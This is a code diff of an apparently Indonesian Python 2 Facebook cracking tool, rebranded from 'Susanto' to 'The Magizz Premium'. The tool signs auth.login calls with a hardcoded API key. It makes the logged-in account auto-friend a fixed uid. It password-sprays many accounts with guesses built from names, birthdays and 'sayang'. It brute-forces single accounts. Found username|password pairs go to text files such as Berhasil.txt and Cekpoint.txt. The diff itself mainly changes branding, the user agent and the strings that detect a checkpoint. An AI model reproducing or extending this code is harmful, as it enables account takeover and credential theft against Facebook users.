@@ -1,4 +1,4 @@
-﻿# -*- coding: utf-8 -*-
+# -*- coding: utf-8 -*-
 
 import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, requests, mechanize
 from multiprocessing.pool import ThreadPool
@@ -19,7 +19,13 @@ sys.setdefaultencoding('utf8')
 br = mechanize.Browser()
 br.set_handle_robots(False)
 br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
-br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/43.2.2254/14.0293; U; id) Presto/2.12.423 Version/12.16')]
+br.addheaders = [('User-Agent', 'Mozilla/5.0 (XII;Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36')]
+
+
+def keluar():
+    print '\x1b[1;91m[!] Tutup'
+    os.sys.exit()
+
 
 def jalan(z):
     for e in z + '\n':
@@ -27,13 +33,13 @@ def jalan(z):
         sys.stdout.flush()
         time.sleep(0.01)
 
-logo = "\x1b[1;97m█████████\n \x1b[1;97m█▄█████▄█         \x1b[1;97m●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●\n \x1b[1;97m█ \x1b[1;96m▼▼▼▼▼  \x1b[1;97m- _ --_-- \x1b[1;92m╔╦╗┌─┐┬─┐┬┌─   ╔═╗╔╗ \n \x1b[1;92m█  \x1b[1;97m  \x1b[1;97m_-_-- -_ --__ \x1b[1;97m ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗\n \x1b[1;97m█ \x1b[1;97m▲▲▲▲▲ \x1b[1;97m--  - _ -- \x1b[1;97m═╩╝┴ ┴┴└─┴ ┴   ╚  ╚═╝  \x1b[1;93mSusanto\n \x1b[1;92m█████████         \x1b[1;97m«==========✧==========»\n \x1b[1;92m ██ ██\n \x1b[1;97m╔════════════════════════════════════════════════╗\n \x1b[1;97m║ \x1b[1;93m*  \x1b[1;97mReCode   \x1b[1;91m:  \x1b[1;96m Susanto   \x1b[1;97m                   ║\n \x1b[1;97m║ \x1b[1;93m*  \x1b[1;97mGitHub   \x1b[1;91m:  \x1b[1;92m \x1b[92mhttps://github.com/m3dpr0    \x1b[    \x1b[1;97m ║\n \x1b[1;97m║ \x1b[1;93m*  \x1b[1;97mFB       \x1b[1;91m:   \x1b[1;92\x1b[92mfb.me/medpro.indonesia\x1b[     \x1b[1;97m  ║   \n \x1b[1;97m╚════════════════════════════════════════════════╝"  '\n\x1b[1;92m[*] Jangan Lupa Follow Ig : medpro.indonesia Contack WA : 081617772813 \n'
+logo = " \x1b[1;92m█████████\n \x1b[1;92m█▄█████▄█         \x1b[1;97m●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●\n \x1b[1;92m█ \x1b[1;93m▼▼▼▼▼  \x1b[1;97m- _ --_-- \x1b[1;92m╔╦╗┌─┐┬─┐┬┌─   ╔═╗╔╗ \n \x1b[1;92m█  \x1b[1;97m  \x1b[1;97m_-_-- -_ --__ \x1b[1;92m ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗\n \x1b[1;92m█ \x1b[1;93m▲▲▲▲▲ \x1b[1;97m--  - _ -- \x1b[1;92m═╩╝┴ ┴┴└─┴ ┴   ╚  ╚═╝  \x1b[1;93mPremium\n \x1b[1;92m█████████         \x1b[1;97m«==========✧==========»\n \x1b[1;92m ██ ██\n \x1b[1;97m╔════════════════════════════════════════════════╗\n \x1b[1;97m║ \x1b[1;93m*  \x1b[1;97mReCode   \x1b[1;91m:  \x1b[1;96m The Magizz  \x1b[1;97m                   ║\n \x1b[1;97m║ \x1b[1;93m*  \x1b[1;97mGitHub   \x1b[1;91m:  \x1b[1;92m \x1b[92mhttps://github.com/TheMagizz\x1b[    \x1b[1;97m ║\n \x1b[1;97m║ \x1b[1;93m*  \x1b[1;97mFB       \x1b[1;91m:   \x1b[1;92\x1b[92mhttps://fb.me/rizz.magizz\x1b[     \x1b[1;97m   ║   \n \x1b[1;97m╚════════════════════════════════════════════════╝"  '\n\x1b[1;92m[*] Silahkan Login Operamini Agar Tidak Checkpoint\n'
 
 def tik():
     titik = [
      '.   ', '..  ', '... ']
     for o in titik:
-        print '\r\x1b[1;91m[\xe2\x97\x8f] \x1b[1;92mMemulai system... \x1b[1;97m' + o,
+        print '\r\x1b[1;91m[\xe2\x97\x8f] \x1b[1;92mLoading \x1b[1;97m' + o,
         sys.stdout.flush()
         time.sleep(0.01)
 
@@ -74,7 +80,7 @@ def login():
         pwd = getpass.getpass('\x1b[1;91m[+] \x1b[1;36mPassword \x1b[1;91m:\x1b[1;92m ')
         tik()
         try:
-            br.open('https://m.facebook.com/')
+            br.open('https://m.facebook.com')
         except mechanize.URLError:
             print '\n\x1b[1;91m[!] Tidak Ada Koneksi'
             keluar()
@@ -87,8 +93,8 @@ def login():
         url = br.geturl()
         if 'save-device' in url:
             try:
-                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=id_IDmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
-                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'id_ID', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
+                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
+                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
                 x = hashlib.new('md5')
                 x.update(sig)
                 a = x.hexdigest()
@@ -101,7 +107,6 @@ def login():
                 zedd.close()
                 print '\n\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mLogin success'
                 requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
-                os.system('xdg-open https://www.whatismyip.com/user-agent-info/')
                 time.sleep(1)
                 menu()
             except requests.exceptions.ConnectionError:
@@ -195,7 +200,7 @@ def pilih():
                         else:
                             if zedd == '6':
                                 os.system('rm -rf login.txt')
-				os.system('xdg-open https://m.facebook.com/')
+				os.system('xdg-open https://m.facebook.com/rizz.magizz')
                                 keluar()
                             else:
                                 if zedd == '0':
@@ -369,7 +374,7 @@ def mini():
                 raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                 menu_hack()
             else:
-                if 'https://m.facebook.com/' in y['error_msg']:
+                if 'www.facebook.com' in y['error_msg']:
                     print '\x1b[1;91m[+] \x1b[1;92mFounded.'
                     print '\x1b[1;91m[!] \x1b[1;93mAccount Maybe Checkpoint'
                     print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
@@ -389,7 +394,7 @@ def mini():
                         raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                         menu_hack()
                     else:
-                        if 'https://m.facebook.com/' in y['error_msg']:
+                        if 'www.facebook.com' in y['error_msg']:
                             print '\x1b[1;91m[+] \x1b[1;92mFounded.'
                             print '\x1b[1;91m[!] \x1b[1;93mAccount Maybe Checkpoint'
                             print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
@@ -409,7 +414,7 @@ def mini():
                                 raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                                 menu_hack()
                             else:
-                                if 'https://m.facebook.com/' in y['error_msg']:
+                                if 'www.facebook.com' in y['error_msg']:
                                     print '\x1b[1;91m[+] \x1b[1;92mFounded.'
                                     print '\x1b[1;91m[!] \x1b[1;93mAccount Maybe Checkpoint'
                                     print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
@@ -430,7 +435,7 @@ def mini():
                                         raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                                         menu_hack()
                                     else:
-                                        if 'https://m.facebook.com/' in y['error_msg']:
+                                        if 'www.facebook.com' in y['error_msg']:
                                             print '\x1b[1;91m[+] \x1b[1;92mFounded.'
                                             print '\x1b[1;91m[!] \x1b[1;93mAccount Maybe Checkpoint'
                                             print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
@@ -450,7 +455,7 @@ def mini():
                                                 raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                                                 menu_hack()
                                             else:
-                                                if 'https://web.facebook.com/login/device-based/regular/login/?login_attempt=1' in y['error_msg']:
+                                                if 'www.facebook.com' in y['error_msg']:
                                                     print '\x1b[1;91m[+] \x1b[1;92mFounded.'
                                                     print '\x1b[1;91m[!] \x1b[1;93mAccount Maybe Checkpoint'
                                                     print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
@@ -527,16 +532,16 @@ def scrak():
                 berhasil.append('\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] ' + username + ' | ' + passw)
                 back += 1
             else:
-                if 'https://web.facebook.com/login/device-based/regular/login/?login_attempt=1' in mpsh:
-                    bisa = open('Berhasil.txt', 'w')
-                    bisa.write(username + ' | ' + passw + '\n')
-                    bisa.close()
-                    berhasil.append('\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] ' + username + ' | ' + passw)
+                if 'www.facebook.com' in mpsh['error_msg']:
+                    cek = open('Cekpoint.txt', 'w')
+                    cek.write(username + ' | ' + passw + '\n')
+                    cek.close()
+                    cekpoint.append('\x1b[1;97m[\x1b[1;93m\xe2\x9c\x9a\x1b[1;97m] ' + username + ' | ' + passw)
                     back += 1
                 else:
-                    berhasil.append(username)
+                    gagal.append(username)
                     back += 1
-            sys.stdout.write('\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mCrack    \x1b[1;91m:\x1b[1;97m ' + str(back) + ' \x1b[1;96m>\x1b[1;97m ' + str(len(up)) + ' =>\x1b[1;92mLive\x1b[1;91m:\x1b[1;96m' + str(len(berhasil)) + ' \x1b[1;97m=>\x1b[1;93mLive\x1b[1;91m:\x1b[1;96m' + str(len(berhasil)))
+            sys.stdout.write('\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mCrack    \x1b[1;91m:\x1b[1;97m ' + str(back) + ' \x1b[1;96m>\x1b[1;97m ' + str(len(up)) + ' =>\x1b[1;92mLive\x1b[1;91m:\x1b[1;96m' + str(len(berhasil)) + ' \x1b[1;97m=>\x1b[1;93mCheck\x1b[1;91m:\x1b[1;96m' + str(len(cekpoint)))
             sys.stdout.flush()
 
     except IOError:
@@ -660,7 +665,7 @@ def pilih_super():
                 if 'access_token' in q:
                     print '\x1b[1;97m\x1b[1;92m[✓]\x1b[1;97m ' + user + ' | ' + pass1 + ' --> ' + b['name']
                 else:
-                    if 'https://web.facebook.com/login/device-based/regular/login/?login_attempt=1' in q['error_msg']:
+                    if 'www.facebook.com' in q['error_msg']:
                         print '\x1b[1;97m\x1b[1;93m[+]\x1b[1;97m ' + user + ' | ' + pass1 + ' --> ' + b['name']
                     else:
                             pass2 = b['firs_name'] + '12345'
@@ -669,7 +674,7 @@ def pilih_super():
                             if 'access_token' in q:
                                 print '\x1b[1;97m\x1b[1;92m[✓]\x1b[1;97m ' + user + ' | ' + pass2 + ' --> ' + b['name']
                             else:
-                                if 'https://web.facebook.com/login/device-based/regular/login/?login_attempt=1' in q['error_msg']:
+                                if 'www.facebook.com' in q['error_msg']:
                                     print '\x1b[1;97m\x1b[1;93m[+]\x1b[1;97m ' + user + ' | ' + pass2 + ' --> ' + ['name']
                                 else:
                                         pass3 = b['last_name'] + '123'
@@ -678,7 +683,7 @@ def pilih_super():
                                         if 'access_token' in q:
                                             print '\x1b[1;97m\x1b[1;92m[✓]\x1b[1;97m ' + user + ' | ' + pass3 + ' --> ' + b['name']
                                         else:
-                                            if 'https://web.facebook.com/login/device-based/regular/login/?login_attempt=1' in q['error_msg']:
+                                            if 'www.facebook.com' in q['error_msg']:
                                                 print '\x1b[1;97m\x1b[1;93m[+]\x1b[1;97m ' + user + ' | ' + pass3 + ' --> ' + b['name']
                                             else:
 						    pass4 = b['last_name'] + '12345'
@@ -687,7 +692,7 @@ def pilih_super():
                                                     if 'access_token' in q:
                                                         print '\x1b[1;97m\x1b[1;92m[✓]\x1b[1;97m ' + user + ' | ' + pass4 + ' --> ' + b['name']
                 				    else:
-                                                        if 'https://web.facebook.com/login/device-based/regular/login/?login_attempt=1' in q['error_msg']:
+                                                        if 'www.facebook.com' in q['error_msg']:
                                                             print '\x1b[1;97m\x1b[1;93m[+]\x1b[1;97m ' + user + ' | ' + pass4 + ' --> ' + b['name']
                     					else:
                                                                 birthday = b['birthday']
@@ -697,7 +702,7 @@ def pilih_super():
                                                                 if 'access_token' in q:
                                                                     print '\x1b[1;97m\x1b[1;92m[✓]\x1b[1;97m ' + user + ' | ' + pass5 + ' --> ' + b['name']
                                                                 else:
-                                                                    if 'https://web.facebook.com/login/device-based/regular/login/?login_attempt=1' in q['error_msg']:
+                                                                    if 'www.facebook.com' in q['error_msg']:
                                                                         print '\x1b[1;97m[\x1b[1;93m[+]\x1b[1;97m ' + user + ' | ' + pass5 + ' --> ' + b['name']
                                                                     else:
                                                                             pass6 = ('sayang')
@@ -706,7 +711,7 @@ def pilih_super():
                                                                             if 'access_token' in q:
                                                                                 print '\x1b[1;97m\x1b[1;92m[✓]\x1b[1;97m ' + user + ' | ' + pass6 + ' --> ' + b['name']
                                                                             else:
-                                                                                if 'https://web.facebook.com/login/device-based/regular/login/?login_attempt=1' in q['error_msg']:
+                                                                                if 'www.facebook.com' in q['error_msg']:
                                                                                     print '\x1b[1;97m\x1b[1;93m[+]\x1b[1;97m ' + user + ' | ' + pass6 + ' --> ' + b['name']
 
         except:
@@ -759,7 +764,7 @@ def brute():
                         print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword \x1b[1;91m:\x1b[1;97m ' + pw
                         keluar()
                     else:
-                        if 'https://web.facebook.com/login/device-based/regular/login/?login_attempt=1' in mpsh['error_msg']:
+                        if 'www.facebook.com' in mpsh['error_msg']:
                             ceks = open('Brutecekpoint.txt', 'w')
                             ceks.write(email + ' | ' + pw + '\n')
                             ceks.close()
@@ -2196,4 +2201,5 @@ def gaz(toket, enable=True):
 
 if __name__ == '__main__':
 	login()
+
 
